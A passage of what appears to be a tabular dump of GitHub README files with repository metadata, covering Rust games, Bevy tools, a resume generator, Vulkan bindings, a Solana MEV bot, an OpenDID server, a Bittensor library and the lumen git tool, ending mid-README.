coreyja/crowd-source-bytes,main,"# Open Source Bytes: Rust Games üéÆ

Welcome to Open Source Bytes, a collection of fun and educational Rust games! ü¶Ä

Play the Bytes on [here](https://coreyja.com/bytes)!

#### üìöTL:DR
- Bytes are Rust coding games designed for pure Rust learning! üöÄ
- We love Rust and want everyone else to learn. What better way to learn than by reading Rust code and guessing what bugs there are? üêõ
- We want you to contribute your own Bytes to make the Rust challenges even more fun! ü§ù Be creative! 

![Bytes Demo](bytes-demo.gif)

## ü§ù Contribute

Build small Rust CLI projects! Just make sure you follow these rules:

1. Be unique üåü
2. Code must compile! ‚úÖ
3. Add Tests to your code üß™
4. Make it short and sweet! We want other students to be able to read and understand these in one go üí™

## üí° Example Bytes

Here are some ideas to get you started. Each Byte is designed to be a small, self-contained project that is easy to understand and work with:

- Banking System: Manage accounts, transactions, balances and interest rates.
- AI Coffee Shop: Utilize LLM that can take customer orders through the CLI.
- Weather Forecasting: Input location and get a simulated weather forecast.
- Explore more [Byte Ideas](https://github.com/coreyja/crowd-source-bytes/issues)! Feel free to take on any idea! Just leave a comment saying, ""I'll work on this!"" You'll have one week to complete it once you claim an idea.


## üöÄ Getting Started

If you have an idea for a new Byte and want to discuss it before writing code, you can start by opening an issue:

1. **Open an Issue for Brainstorming**  
   - Navigate to the [Issues](https://github.com/coreyja/crowd-source-bytes/issues) tab.
   - Click on **New Issue** and select the **Brainstorming** label.
   - Describe your idea in detail to allow others to provide feedback and suggestions.
   - See an example of a brainstorming issue [here](https://github.com/coreyja/crowd-source-bytes/issues/2)

2. **Collaborate and Refine**  
   - Engage with the community by responding to comments.
   - Refine your idea based on the feedback received.

3. **Proceed to Implementation**  
   - Once your idea is well-defined, follow the steps below to build your Byte.

## üßë‚Äçüíª How to Build a Byte

### Fork and Clone the Repository

1. Fork the repository: https://github.com/coreyja/crowd-source-bytes
2. Clone your forked repository:
   ```
   git clone https://github.com/YOUR_USERNAME/crowd-source-bytes.git
   cd crowd-source-bytes
   ```
3. Create a new branch with the following branch name style:
   ```
   git checkout -b <your-name>/main/<name-of-byte>-byte
   ```

### Create a New Rust Project

1. Create a new Rust project for your byte:
   ```
   cargo new <name-of-your-byte>
   ```
2. Add the name of your project to the `members` list in the root `Cargo.toml` file. This sets up a Cargo workspace with all the packages together! More info about workspaces here: https://doc.rust-lang.org/book/ch14-03-cargo-workspaces.html
3. Navigate to your new byte project:
   ```
   cd <name-of-your-byte>
   ```
4. Open `src/main.rs` and write your code for your byte.

## üéâ Prepare Your Contribution

### Submit a Pull Request

1. Commit your changes:
   ```
   git add .
   git commit -m ""Add <name-of-your-byte> Byte""
   ```
2. Push your changes to your fork:
   ```
   git push origin <your-name>/main/<name-of-byte>-byte
   ```
3. Write a description of your Byte and instructions on how to run it locally.
4. Add test cases to the `tests/` directory.
5. Create a test plan for your Byte, including:
   - A description of the test plan
   - Expected output
6. Leave comments in the diff indicating where you want the ""bug"" to be üêû
7. Run `cargo fmt` to make sure your code is formatted according to Rust formatting rules
8. Run `cargo clippy` to make sure it passes all the lints defined. Clippy is also a great tool for learning new tips and tricks in Rust!
9. Run `cargo test` and make sure it passes all the tests you wrote
10. Submit your Pull Request for review.

Remember, the goal is to create fun, educational challenges for the Rust community! üéì

## üéä Join the Fun

Start coding, start learning, and most importantly, have fun with Rust! üéä

Happy coding, Rustaceans! ü¶Ä

## ü§ù Connect with Us

Join our Discord community to discuss ideas, get support, ask questions, and get guidance on launching your Byte! [Coreyja Club](https://coreyja.club/)
",0,10,4,,test.yaml,8.0
oscrim/bevy_map_camera,main,"# `bevy_map_camera`

[![docs.rs](https://docs.rs/bevy_map_camera/badge.svg)](https://docs.rs/bevy_map_camera)
[![crates.io](https://img.shields.io/crates/v/bevy_map_camera)](https://crates.io/crates/bevy_map_camera)

A 3D camera controller inspired by Google Maps, [f4maps](https://demo.f4map.com/) and [Charge Finder](https://chargefinder.com/nearby).

![bevy_map_camera example](https://github.com/user-attachments/assets/1ac13767-9ad9-495f-90fd-9f8b765347ba)

Based upon LookTransform, LookAngles and Orbital Camera Controller from [`smooth-bevy-cameras`](https://github.com/bonsairobo/smooth-bevy-cameras).

## Features

- Orbital camera
- Zoom towards pointer
- Grab pan
  - Configurable height
- Camera target follows XZ-plane
- Support for Perspective and Orthographic projection
- Smoothed movement
- Customizable keyboard/mouse controls
- Touch support
  - One finger pan
  - Two finger rotate
  - Pinch to zoom
- Supports Easing though [`bevy_easings`](https://github.com/vleue/bevy_easings), part of `default` features.
  - Implemented for `LookTransform`
- Supports Tweening through [`bevy_tweening`](https://github.com/djeedai/bevy_tweening), requires `bevy_tweening` feature.
  - Lenses
    - `LookTransformLens`
    - `GrabHeightLens`

## Quick Start

```rs
use bevy::prelude::*;

use bevy_map_cam::{CameraBundle, LookTransform, MapCameraPlugin};

fn main() {
    let mut app = App::new();
    app.add_plugins(DefaultPlugins);
    app.add_plugins(MapCameraPlugin::default());

    app.add_systems(Startup, setup);
    app.run();
}

fn setup(
    mut commands: Commands,
) {
        commands.spawn(CameraBundle::new_with_transform(LookTransform::new(
        Vec3 {
            x: 1.,
            y: 2.5,
            z: 5.0,
        },
        Vec3::ZERO,
        Vec3::Y,
    )));
}
```

Check out the [projection example](https://github.com/oscrim/bevy_map_camera/blob/main/examples/projection.rs) to see how to change between Perspective and Orthographic.

## Compatible Bevy versions

The `main` branch is compatible with the latest Bevy release.

| bevy_map_camera | bevy |
| :--             | :--  |
| 0.1             | 0.14 |
",0,1,1,MIT,,0.0
unexcellent/rsume,main,"# rsume
A tool for effortlessly generating resumes.

## Elevator Pitch
The hiring process as a software developer can be super tedious. You never hear back from the majority of companies you have applied to and if they reach out, you have to jump through a lot of hoops to land the job. Since it is recommended to customize your resume for every single application, it may mean that you have to create dozens of resume before finally getting hired. Who has time for that? This tool is here to simplify the process by generating a high-quality resume with minimal work required.

## Getting started
Currently, the only supported method for installing this program is by downloading or cloning this repo and building the binary yourself using `cargo` or `rustc`.

An instance of Google Chrome or Chromedriver is required for executing the program.

## Usage
`rsume`should be used from the command line like this:
```bash
rsume /path/to/resume_data.yaml /target/path.pdf --template ""coruscant"" --language ""english""
```
The `--template` and `--language` options are optional.

The resume data should follow the [JSONResume](https://jsonresume.org/) schema and can either be stored as a `.json` or `.yaml` file. Look at [examples/kirk_resume_en.yaml](https://github.com/unexcellent/rsume/blob/main/examples/kirk_resume_en.yaml).

## Known Issues
Currently, only a single template is available. In the future more template are planned.
- If the content of the resume is short enough that only one page is filled, an empty second page is generated regardless
- Page breaks in the coruscant template may separate the section title (like ""Education"") from the first entry",0,0,3,Apache-2.0,,5.0
pythonspeed/mandelbrot-simd,main,"# Mandelbrot

This repository includes multiple implementations of the Mandelbrot algorithm in Rust, showing how parallelism and SIMD can be used to speed it up:

* **Scalar:** The standard algorithm, one value at a time.
* **Portable SIMD / `std::simd`**: Uses the built-in portable SIMD support in Rust, requires unstable compiler.
* **Scalar with autovectorization:** A scalar version written so the compiler can autovectorize it, i.e. decide to use SIMD automatically.
* **`wide` SIMD**: Use the `wide` crate to implement portable SIMD operations. Can use stable compiler.

All implementations use parallelism out of the box, using Rayon.

## History

Much of this is based on the [`mandelbrot` benchmark from the benchmarksgame][bg], as implemented in the since-superseded [`packed_simd` project](https://github.com/rust-lang/packed_simd/tree/master/examples/mandelbrot).

Changes from the original implementation:

* Updated to use the newer [Rust portable SIMD API](https://doc.rust-lang.org/std/simd/index.html) (nightly only at the moment).
* Simplified the calculation logic so it's easier to understand.
* Autovectorized implementation contributed by [https://github.com/giovannicuccu](`giovannicuccu`).

Licensed under MIT or Apache 2.0, at your choice, copyrighted by the Rust Project Developers, with minor changes by Itamar Turner-Trauring.

## Background

http://mathworld.wolfram.com/MandelbrotSet.html

## Usage

It takes four arguments in this order:

* `width`: width of the image to render
* `height`: height of the image to render
* `algorithm`: algorithm to use:
  * `scalar`: scalar algorithm
  * `simd`: parallelized SIMD algorithm
  * `ispc`: ISPC + tasks algorithm
* `--color` (optional): enables colorized output, which also determines the image format.
  * disabled (default): PBM: Portable BitMap format (black & white output)
  * enabled: PPM: Portable PixMap format (colored output)

The resulting image is piped to `stdout`.

`cargo run --release -- 400 400 --algo simd > output.ppm` outputs:

![run_400_png](https://user-images.githubusercontent.com/904614/43190942-72bdb834-8ffa-11e8-9dcf-a9a9632ae907.png)

`cargo run --release -- 400 400 --algo simd --color > output.ppm` outputs:

![run_400_400_1_1_png](https://user-images.githubusercontent.com/904614/43190948-759969a4-8ffa-11e8-81a9-35e5baef3e86.png)

## Performance

Make sure you have `hyperfine` installed.

Multi-threaded:
```
$ ./benchmark.sh
```

Single-threaded:

```
$ RAYON_NUM_THREADS=1 ./benchmark.sh
```

[bg]: https://benchmarksgame-team.pages.debian.net/benchmarksgame/description/mandelbrot.html#mandelbrot
",0,4,2,Apache-2.0,,1.0
chuigda/vulkan4j,master,"# vulkan4j

> [Discord](https://discord.gg/UsmRvrt4gg)

[Vulkan](https://www.vulkan.org/) Binding for Java using [Project Panama](https://openjdk.org/projects/panama/) `java.lang.foreign` APIs.

*Heavily inspired by the [`vulkanalia`](https://github.com/KyleMayes/vulkanalia) crate.*

## [Vulkan tutorial](https://vulkan4j.7dg.tech/tutorial/en/)
For users new to Vulkan, there is a (almost) complete adaptation of [https://vulkan-tutorial.com](https://vulkan-tutorial.com) by [Alexander Overvoorde](https://github.com/Overv) to use Java and vulkan4j instead of C++. The published version of this tutorial can be found [here](https://vulkan4j.7dg.tech/tutorial/en/), and the sources for the tutorial (including standalone working code examples for each chapter) can be found under the `tutorial` directory.

## Overview
[`panama-plus`](https://github.com/chuigda/vulkan4j/tree/master/panama-plus) is a small utility library that gives a thin wrapper over Project Panama `java.lang.foreign` APIs to make them easier and more type-safe to use. It is used by `vulkan4j` to provide a more Java-friendly API for Vulkan.

[`vk4j`](https://github.com/chuigda/vulkan4j/tree/master/vk4j) is the main library that provides the Vulkan bindings. Bindings are generated from [`vk.xml`](https://github.com/KhronosGroup/Vulkan-Docs/blob/main/xml/vk.xml) using [`vkxml2java`](https://github.com/chuigda/vulkan4j/tree/master/vk4j/vkxml2java) *(we plan to switch to `codegen` module soon)*.

[`vma`](https://github.com/chuigda/vulkan4j/tree/master/vma) is a binding to the Vulkan Memory Allocator library. It is generated from [`vk_mem_alloc.h`](https://github.com/GPUOpen-LibrariesAndSDKs/VulkanMemoryAllocator/blob/master/include/vk_mem_alloc.h) using the `codegen` module.

[`glfw`](https://github.com/chuigda/vulkan4j/tree/master/glfw) is a wrapper around the GLFW library that provides a more Java-friendly API for creating windows and handling input. It is generated from [GLFW header files](https://github.com/glfw/glfw/tree/master/include/GLFW) using the `codegen` module.

[`gles2`](https://github.com/chuigda/vulkan4j/tree/master/gles2) provides OpenGL ES2 bindings. Bindings are generated from [`gl.xml`](https://github.com/KhronosGroup/OpenGL-Registry/blob/main/xml/gl.xml) using the `codegen` module. 

## Roadmap
- [x] Generate fundamental Vulkan API bindings using `vkxml2java` from `vk.xml`
- [x] Take off!
- [x] Vulkan tutorial
  - [ ] Chinese translation 
- [x] Generate GLFW bindings using `codegen`
- [x] Generate OpenGL ES2 bindings using `codegen`
- [x] Generate or write Vulkan Memory Allocator API bindings
- [ ] Switch to `codegen` for Vulkan bindings
- [ ] Generate Vulkan Video API bindings
",1,12,2,BSD-3-Clause,website.yml,5.0
heydocode/limitpush,main,"# LimitPush: Bevy Game Template

Welcome to **LimitPush**: a modular, high-performance game template for the [Bevy game engine](https://bevyengine.org/), designed with both flexibility and ease of use in mind. This project is a work in progress, but it's making rapid strides towards a stable, feature-rich foundation for 2D and 3D Bevy games.

## Technologies

This project uses [`bevy`](https://bevyengine.org) as a **game framework** and its **community crates** by organizing everything in the **rusty** way. So, this project is written in rust, with some script and web components for automatic updates/builds and [`wasm`](https://trunkrs.dev/) builds. Also, this project does graphs (check the [`Graph` section](https://github.com/heydocode/limitpush/blob/main/README.md#graph)) with automated scripts.

## üöÄ About the Project

**LimitPush** aims to be a universal template that enables rapid development and easy extension. By leveraging a **modular crate architecture**, it offers:
- **Customizability**: Adjust gameplay components like player movement, object spawners, and more.
- **Cross-platform support**: Compatibility across mobile, web, and desktop platforms.
- **Future-proofing**: Plans for additional platform support and optimized performance for various hardware setups.

## How You Can Help

I‚Äôm excited to connect with contributors, testers, and supporters! Here are a few ways you can get involved:
- **Open Issues**: Encounter a bug or have a feature request? Please share any relevant resources or references to help guide implementation.
- **Code Contributions**: Check out the repo and submit a PR! Contributions are very welcome.
- **Feedback and Ideas**: Share any insights or improvements you think could enhance LimitPush.
- **General Feedback**: Your experiences using the template can help shape its direction and usability.

## Supported Platforms

The template's main goals are **blazing performance** and **broad platform support**. Current compatibility includes:

- **Mobile**:
  - Partial support for Android; testing for other Android distributions and iOS is ongoing.

- **Web**:
  - Fully supported.

- **Desktop**:
  - **MacOS**: Runs on both ARM and Intel-based systems.
  - **Linux**: Tested on Ubuntu.
  - **Windows**: Supported on all current builds, with testing for older versions (e.g., Windows 8) planned.

## Features

LimitPush comes packed with tools and features to streamline development:

- **Modular Design**: The game is organized into **crates** for modularity and flexibility.
- **Debug Menu**: Includes **bevy-inspector-egui** for easy debugging and component inspection.
- **Platform Expansion**: Plans for future support on **Raspberry Pi**, **Steam Deck**, and more.

## Graph

![image](depgraph/internal_crates_graph.png)

## Project Status

LimitPush is currently **unstable** as foundational work is completed, so expect potential breaking changes. A **stable** release is on the roadmap!

## Feedback & Community

Feedback is crucial to making LimitPush a valuable tool. Feel free to reach out in the issues section!

Let‚Äôs build something amazing together: stay tuned for updates, and happy coding! üéÆ
",1,4,3,NOASSERTION,"ci.yml,deploy-page.yaml,release-android-google-play.yaml,release-ios-testflight.yaml,release.yaml",9.0
Kelvin-1013/solana-jito-pumpfun-mevbot,main,"# MEV Bot Solana

Welcome to the MEV Bot Solana repository! This project aims to develop a bot that takes advantage of MEV (Miner Extractable Value) opportunities on the Solana blockchain. 

## Introduction

MEV Bot Solana is a tool designed to monitor and execute transactions on the Solana network to gain profits through MEV strategies. The bot uses advanced techniques to detect and capitalize on arbitrage opportunities, liquidations, and other situations where value can be extracted.

## Requirements

Before getting started, make sure you have the following installed:

- Node.js (version 12 or higher)
- npm (Node.js package manager)
- Solana account with sufficient funds for transactions

## Installation

Follow these steps to install and set up the MEV Bot Solana:

1. Clone this repository to your local machine: `git clone https://github.com/Kelvin-1013/solana-jito-pumpfun-mevbot.git`

2. Navigate to the project directory: `cd mev-bot-solana`

3. Install the project dependencies: `npm install`

4. Configure the environment variables:
  - Create a `.env` file in the project root.
  - Add the following variables and provide your own values:

    ```
    PRIVATE_KEY=<your_solana_private_key>
    RPC_URL=<URL_of_Solana_RPC_node>
    ```

## Usage

Once you have completed the installation and configuration, you can run the MEV Bot Solana by following these steps:

1. Start the bot: `npm start`

2. The bot will begin monitoring the Solana network for MEV opportunities.
3. When an opportunity is detected, the bot will automatically execute the necessary transactions to capitalize on it.
4. You can monitor the bot's activity and the profits earned in the console or in the generated logs.

## Examples

Here are some examples of MEV strategies that the bot can exploit:

- Arbitrage between different Solana exchanges.
- Liquidation of undercollateralized positions in lending protocols.
- Taking advantage of price discrepancies in trading pairs.

For more details on the implemented strategies, refer to the source code in the `src/strategies` directory.

## Contribution

If you would like to contribute to this project, you are welcome to do so! You can follow these steps:

1. Fork this repository.
2. Create a new branch with a descriptive name: `git checkout -b feature/new-strategy`
3. Make your modifications and improvements on the new branch.
4. Ensure that the code follows the style conventions and passes the existing tests.
5. Submit a pull request describing your changes and why they should be incorporated.

## License

This project is distributed under the MIT License. See the `LICENSE` file for more information.
",0,0,1,,,0.0
OmniOneID/did-ta-server,develop,"TAS(Trust Agent Service) Server
==

Welcome to the TAS Server Repository. <br>
This repository contains the source code, documentation, and related resources for the TAS Server.

## Folder Structure
Overview of the major folders and documents in the project directory:

```
did-ta-server
‚îú‚îÄ‚îÄ CHANGELOG.md
‚îú‚îÄ‚îÄ CLA.md
‚îú‚îÄ‚îÄ CODE_OF_CONDUCT.md
‚îú‚îÄ‚îÄ CONTRIBUTING.md
‚îú‚îÄ‚îÄ LICENSE
‚îú‚îÄ‚îÄ dependencies-license.md
‚îú‚îÄ‚îÄ MAINTAINERS.md
‚îú‚îÄ‚îÄ README.md
‚îú‚îÄ‚îÄ RELEASE-PROCESS.md
‚îú‚îÄ‚îÄ SECURITY.md
‚îú‚îÄ‚îÄ docs
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ api
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ TAS_API_ko.md
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ errorCode
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ TAS_ErrorCode.md
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ installation
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ OpenDID_TASServer_InstallationAndOperation_Guide.md
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ db
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ OpenDID_TableDefinition_TAS.md
‚îî‚îÄ‚îÄ source
    ‚îî‚îÄ‚îÄ did-ta-server
        ‚îú‚îÄ‚îÄ gradle
        ‚îú‚îÄ‚îÄ libs
            ‚îî‚îÄ‚îÄ did-sdk-common-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-blockchain-sdk-server-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-core-sdk-server-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-crypto-sdk-server-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-datamodel-sdk-server-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-wallet-sdk-server-1.0.0.jar
        ‚îú‚îÄ‚îÄ sample
        ‚îî‚îÄ‚îÄ src
        ‚îî‚îÄ‚îÄ build.gradle
        ‚îî‚îÄ‚îÄ README.md
        ‚îî‚îÄ‚îÄ README_ko.md
```

<br/>

Below is a description of each folder and file in the directory:

| Name                             | Description                                     |
| -------------------------------- | ----------------------------------------------- |
| CHANGELOG.md                     | Version-specific changes in the project         |
| CODE_OF_CONDUCT.md               | Code of conduct for contributors                |
| CONTRIBUTING.md                  | Contribution guidelines and procedures          |
| LICENSE                          | License                                         |
| dependencies-license.md          | Licenses for the project‚Äôs dependency libraries |
| MAINTAINERS.md                   | Guidelines for project maintainers              |
| RELEASE-PROCESS.md               | Procedures for releasing new versions           |
| SECURITY.md                      | Security policies and vulnerability reporting   |
| docs                             | Documentation                                   |
| ‚îñ api                            | API guide documentation                         |
| ‚îñ errorCode                      | Error codes and troubleshooting guides          |
| ‚îñ installation                   | Installation and setup instructions             |
| ‚îñ db                             | Database ERD,  Table Specifications             |
| source                           | Server source code project                      |
| ‚îñ did-ta-server                  | TAS Server source code and build files          |
| &nbsp;&nbsp;&nbsp;‚îñ gradle       | Gradle build configurations and scripts         |
| &nbsp;&nbsp;&nbsp;‚îñ libs         | External libraries and dependencies             |
| &nbsp;&nbsp;&nbsp;‚îñ sample       | Sample files                                    |
| &nbsp;&nbsp;&nbsp;‚îñ src          | Main source code directory                      |
| &nbsp;&nbsp;&nbsp;‚îñ build.gradle | Gradle build configuration file                 |
| &nbsp;&nbsp;&nbsp;‚îñ README.md    | Overview and instructions for the source code   |

<br/>


## Libraries

Libraries used in this project are organized into two main categories:

1. **Open DID Libraries**: These libraries are developed by the Open DID project and are available in the [libs folder](source/did-ta-server/libs). They include:

   - `did-sdk-common-1.0.0.jar`
   - `did-blockchain-sdk-server-1.0.0.jar`
   - `did-core-sdk-server-1.0.0.jar`
   - `did-crypto-sdk-server-1.0.0.jar`
   - `did-datamodel-sdk-server-1.0.0.jar`
   - `did-wallet-sdk-server-1.0.0.jar`

2. **Third-Party Libraries**: These libraries are open-source dependencies managed via the [build.gradle](source/did-ta-server/build.gradle) file. For a detailed list of third-party libraries and their licenses, please refer to the [dependencies-license.md](dependencies-license.md) file.

## Installation And Operation Guide

For detailed instructions on installing and configuring the TA Server, please refer to the guide below:
- [OpenDID TAS Server Installation and Operation Guide](docs/installation/OpenDID_TASServer_InstallationAndOperation_Guide.md)  

## API Reference

- **TAS API**: Detailed reference for the TAS Server's API endpoints and usage.
  - [TAS API Reference](docs/api/TAS_API_ko.md)

## Change Log

The Change Log provides a detailed record of version-specific changes and updates. You can find it here:
- [Change Log](./CHANGELOG.md)  

## OpenDID Demonstration Videos <br>
To watch our demonstration videos of the OpenDID system in action, please visit our [Demo Repository](https://github.com/OmniOneID/did-demo-server). <br>

These videos showcase key features including user registration, VC issuance, and VP submission processes.

## Contributing

Please read [CONTRIBUTING.md](CONTRIBUTING.md) and [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) for details on our code of conduct, and the process for submitting pull requests to us.

## License
[Apache 2.0](LICENSE)
",1,0,2,Apache-2.0,"auto-assign.yml,build.yml,ci.yml",13.0
womboai/rusttensor,main,"# Rusttensor

A low level Rust library for creating and interacting with Bittensor subnets, originally developed for [rule30 / Subnet 36](https://github.com/womboai/rule-30-solver). Built using [subxt](https://github.com/paritytech/subxt)

## Features

- Type safe runtime APIs such as neuron info, hyperparameters, stake info and delegate info
- Type safe extrinsics such as weight setting, axon serving, and much, _much_ more
- Easy access to storage without direct APIs
- Coldkey and hotkey loading utilities
- Auto-generated chain metadata types and functions to ensure everything is tested at compile-time
- Access to chain constants locally at compile-time with no network roundabout
- Full control and flexibility over transaction creation, signing and submission. Along with full flexibility over block hash handling to allow avoiding extra subtensor calls. 

## Prerequisites

- Rust toolchain (latest stable version)
- Cargo package manager
- Access to a Bittensor chain endpoint (such as `wss://entrypoint-finney.opentensor.ai:443`)

## Installation

Add this to your `Cargo.toml`:

```toml
[dependencies]
rusttensor = { git = ""https://github.com/womboai/rusttensor"", tag = ""v0.3.0"" }
```

## Usage Examples

### Creating a client and connecting to the subtensor

```rust
use rusttensor::subtensor::{self, Subtensor, SubtensorUrl};

async fn create_client() -> Result<Subtensor, ...> {
    // Creating client to interact with subtensor
    subtensor::from_url(SubtensorUrl::Finney).await;
}
```

### Unauthorized queries

#### Block Management

`rusttensor`, based on `subxt` allows all the functionality that `subxt` provides, including the blocks API. You can fetch metadata about any block, and reuse block hashes as needed.

```rust
use rusttensor::subtensor::Subtensor;

async fn blocks(client: &Subtensor) -> Result<(), ...> {
    // The latest block can be acquired with `blocks().at_latest()`
    let latest = client.blocks().at_latest().await?;

    // The block number, reference and hash can then be acquired
    let block_number = latest.header.number();
    let block_hash = latest.header.hash();
    let block_reference = latest.reference();

    // The reference can be used in selecting runtime APIs or storages to query
}
```

#### Runtime APIs
The most common requests to the subtensor aside from the weight setting and axon serving extrinsics are the runtime APIs used for the metagraph and hyperparameters

By default, most RPC calls at runtime are untyped(returning a Vec<u8>), 
as such, `rusttensor` provides a safety layer in the form of `call_runtime_api_decoded` which allows the runtime APIs to be completely type safe, much like the rest of the API.

```rust
use rusttensor::rpc::{call_runtime_api_decoded, NeuronInfoLite, SubnetHyperparams};
use rusttensor::api;

async fn runtime_apis(client: &Subtensor, block_ref: impl Into<BlockRef<impl BlockHash>>) -> Result<(), ...> {
    // Construct runtime API query for subnet 1 neuron info
    let neurons_lites_payload = api::apis().neuron_info_runtime_api().get_neurons_lite(1);

    // query NeuronInfoRuntimeApi at specific block
    let block_runtime = client.runtime_api().at(block_ref)?;
    let neurons: Vec<NeuronInfoLite> = call_runtime_api_decoded(&block_runtime, neurons_lites_payload).await?;

    // Or query hyperparameters for subnet 2 at latest block
    let hyper_parameters_payload = api::apis().subnet_info_runtime_api().get_subnet_info(2);
    let latest_runtime = client.runtime_api().at_latest().await?;
    let hyperparameters: Option<SubnetHyperparams> = call_runtime_api_decoded(&latest_runtime, hyper_parameters_payload).await?;

    // Some runtime APIs don't need decoding, such as the subnet registration cost API
    let payload = api::apis().subnet_registration_runtime_api().get_network_registration_cost();
    let registration_cost_in_rao = latest_runtime.call(payload).await?;
}
```

#### Storage
Some functionality doesn't have a specific API, such as neuron commitments which are used for arbitrary metadata like in SN39. In such cases, you can access the subtensor storage. 

```rust
use rusttensor::api;

async fn storage(client: &Subtensor) -> Result<(), ...> {
    let account_id: AccountId = ...;

    // Get the commitment :
    let commitment_address = api::storage().commitment_of(39, account_id);
    let latest_storage = client.storage().at_latest().await?;
    let commitment = latest_storage.fetch(commitment_address).await?;

    // Type safe access to commitment
}
```

### Authorized extrinsics

#### Wallet Management (WIP)
You can load existing bittensor wallets created using `btcli` and use them for signing extrinsics such as set_weights or serve_axon. Different kind of wallets can be loaded as follows:
```rust
use rusttensor::wallet::{Signer, home_hotkey_location, load_key_seed, signer_from_seed};

// Create a signer from the private key of a hotkey
fn load_hotkey_signer() -> Result<Signer, ...> {
    let path = home_hotkey_location(""coldkey"", ""hotkey"").expect(""No home directory"");
    let seed = load_key_seed(&path)?;// load seed for creating a signer

    Ok(signer_from_seed(&seed)?)
}

// Or just the account ID from the public key
fn load_hotkey_account_id() -> Result<Signer, ...> {
    let path = home_hotkey_location(""coldkey"", ""hotkey"").expect(""No home directory"");

    Ok(load_key_account_id(&path)?)
}
```

With a signer created in a similar fashion to `load_hotkey_signer`, we can submit extrinsics to the chain.

#### Submitting extrinsics
Some extrinsics have specialized APIs that are nicer to work with, such as `serve_axon` and `set_weights`, which reduce the number of parameters needed and uses more idiomatic types.
Regardless of if the extrinsic has a specialized API or otherwise, submitting them remains the same:

```rust
use rusttensor::subtensor::Subtensor;
use rusttensor::wallet::Signer;
use rusttensor::weights::{set_weights_payload, normalize_weights, NormalizedWeight};

async fn submit_extrinsics(client: &Subtensor, signer: &Signer) -> Result<(), ...> {
    let weights = vec![1.0, 2.0, 3.0];

    let weights = normalize_weights(&weights)
        .enumerate()
        .map(|(index, weight)| NormalizedWeight {
            uid: index as u16,
            weight,
        });

    let payload = set_weights_payload(
        1, // netuid
        weights,
        0, // version_key
    );

    // if your extrinsic doesn't have a wrapping API, it can be created using api::tx(), such as api::tx().subtensor_module().dissolve_network(30) for dissolving SN30

    // Submit the transaction
    let transaction = subtensor.client
        .tx()
        .sign_and_submit_then_watch_default(&payload, keypair) // or sign_and_submit_default to avoid waiting for inclusion
        .await?;

    // watch transaction if needed to wait for finalization

    Ok(())
}
```

## Building

```bash
cargo build --release
```

## Development

The project uses a build script (`build.rs`) to automatically generate Substrate metadata types at compile time. This ensures type safety and up-to-date chain compatibility.

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## Note on Security

Always handle wallet keys and sensitive information with care. Never share or commit private keys or seed phrases.
",3,1,1,,,0.0
jnsahaj/lumen,main,"# <p align=""center""><img src=""https://github.com/user-attachments/assets/896f9239-134a-4428-9bb5-50ea59cdb5c3"" alt=""lumen"" /></p>

[![Crates.io Total Downloads](https://img.shields.io/crates/d/lumen?label=downloads%20%40crates.io)](https://crates.io/crates/lumen)
![GitHub License](https://img.shields.io/github/license/jnsahaj/lumen)
![Crates.io Size](https://img.shields.io/crates/size/lumen)

A command-line tool that uses AI to streamline your git workflow - from generating commit messages to explaining complex changes, all without requiring an API key.

![demo](https://github.com/user-attachments/assets/0d029bdb-3b11-4b5c-bed6-f5a91d8529f2)

## Table of Contents
- [Features](#features-)
- [Getting Started](#getting-started-)
  - [Prerequisites](#prerequisites)
  - [Installation](#installation)
- [Usage](#usage-)
  - [Generate Commit Messages](#generate-commit-messages)
  - [Explain Changes](#explain-changes)
  - [Interactive Mode](#interactive-mode)
  - [Tips & Tricks](#tips--tricks)
- [AI Providers](#ai-providers-)
- [Advanced Configuration](#advanced-configuration-)
  - [Configuration File](#configuration-file)
  - [Configuration Precedence](#configuration-precedence)

## Features üîÖ

- **Smart Commit Messages**: Generate conventional commit messages for your staged changes
- **Git History Insights**: Understand what changed in any commit, branch, or your current work
- **Interactive Search**: Find and explore commits using fuzzy search
- **Change Analysis**: Ask questions about specific changes and their impact
- **Zero Config**: Works instantly without an API key, using Phind by default
- **Flexible**: Works with any git workflow and supports multiple AI providers
- **Rich Output**: Markdown support for readable explanations and diffs (requires: mdcat)

## Getting Started üîÖ

### Prerequisites
Before you begin, ensure you have:
1. `git` installed on your system
2. [fzf](https://github.com/junegunn/fzf) (optional) - Required for `lumen list` command
3. [mdcat](https://github.com/swsnr/mdcat) (optional) - Required for pretty output formatting

### Installation

#### Using Homebrew (MacOS and Linux)
```bash
brew install jnsahaj/lumen/lumen
```

#### Using Cargo
> [!IMPORTANT]
> `cargo` is a package manager for `rust`,
> and is installed automatically when you install `rust`.
> See [installation guide](https://doc.rust-lang.org/cargo/getting-started/installation.html)
```bash
cargo install lumen
```

## Usage üîÖ

### Generate Commit Messages

Create meaningful commit messages for your staged changes:

```bash
# Basic usage - generates a commit message based on staged changes
lumen draft
# Output: ""feat(button.tsx): Update button color to blue""

# Add context for more meaningful messages
lumen draft --context ""match brand guidelines""
# Output: ""feat(button.tsx): Update button color to align with brand identity guidelines""
```

### Explain Changes

Understand what changed and why:

```bash
# Explain current changes in your working directory
lumen explain --diff                  # All changes
lumen explain --diff --staged         # Only staged changes

# Explain specific commits
lumen explain HEAD                    # Latest commit
lumen explain abc123f                 # Specific commit
lumen explain HEAD~3..HEAD            # Last 3 commits
lumen explain main..feature/A         # Branch comparison

# Ask specific questions about changes
lumen explain --diff --query ""What's the performance impact of these changes?""
lumen explain HEAD --query ""What are the potential side effects?""
```

### Interactive Mode
```bash
# Launch interactive fuzzy finder to search through commits (requires: fzf)
lumen list
```

### Tips & Tricks

```bash
# Copy commit message to clipboard
lumen draft | pbcopy                  # macOS
lumen draft | xclip -selection c      # Linux

# Open in your favorite editor
lumen draft | code -      

# Directly commit using the generated message
lumen draft | git commit -F -           
```

## AI Providers üîÖ

Configure your preferred AI provider:

```bash
# Using CLI arguments
